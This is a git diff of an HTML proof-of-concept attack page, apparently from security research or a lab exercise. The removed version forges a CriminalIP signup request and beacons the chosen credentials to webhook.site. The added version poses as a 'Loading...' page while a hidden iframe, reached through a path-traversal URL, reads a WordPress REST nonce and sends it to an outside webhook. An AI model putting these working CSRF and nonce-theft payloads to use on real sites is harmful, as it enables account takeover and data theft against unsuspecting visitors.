@@ -1,43 +1,39 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>CriminalIP CSRF PoC</title>
-  </head>
-  <body>
-    <h1>CSRF PoC + Webhook Exfiltration</h1>
-    <script>
-      const email = "csrfvictim" + Math.floor(Math.random() * 100000) + "@evil.com";
-      const password = "Attacker@123";
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+  <h1>Please wait, loading your content...</h1>
 
-      // Step 1: Trigger CSRF on CriminalIP signup endpoint
-      fetch("https://www.criminalip.io/api/auth/user/signup", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          account_type: "not_social",
-          email: email,
-          uid: "",
-          name: "CSRF Victim",
-          pw: password,
-          pp_agree_code: "1",
-          tos_agree_code: "1",
-          ad_agree_code: "1"
-        })
-      });
+  <script>
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = '/wp-includes/js/api-request.min.js/../../../my-account/edit-account/';
+    document.body.appendChild(iframe);
 
-      // Step 2: Exfiltrate to webhook.site using text/plain
-      navigator.sendBeacon(
-        "https://webhook.site/61001786-599b-402b-bcc7-4fbd4fc63a88",
-        new Blob(
-          [
-            `email=${email}\npassword=${password}\nnote=csrf poc from github.io`
-          ],
-          { type: "text/plain" }
-        )
-      );
-    </script>
-  </body>
+    iframe.onload = function() {
+      try {
+        const doc = iframe.contentDocument || iframe.contentWindow.document;
+        const script = doc.querySelector('#wp-api-request-js-extra');
+        
+        if (script) {
+          const text = script.textContent;
+          const nonceMatch = text.match(/"nonce":"([a-f0-9]+)"/);
+          
+          if (nonceMatch) {
+            const nonce = nonceMatch[1];
+            fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa', {
+              method: 'POST',
+              body: JSON.stringify({ nonce: nonce, victim: 'Carlos' }),
+              mode: 'no-cors'
+            });
+          }
+        }
+      } catch (e) {
+        fetch('https://webhook.site/8e6d3cb2-a3f0-4286-b5a0-c629298bd1aa?error=' + encodeURIComponent(e.message), { mode: 'no-cors' });
+      }
+    };
+  </script>
+</body>
 </html>
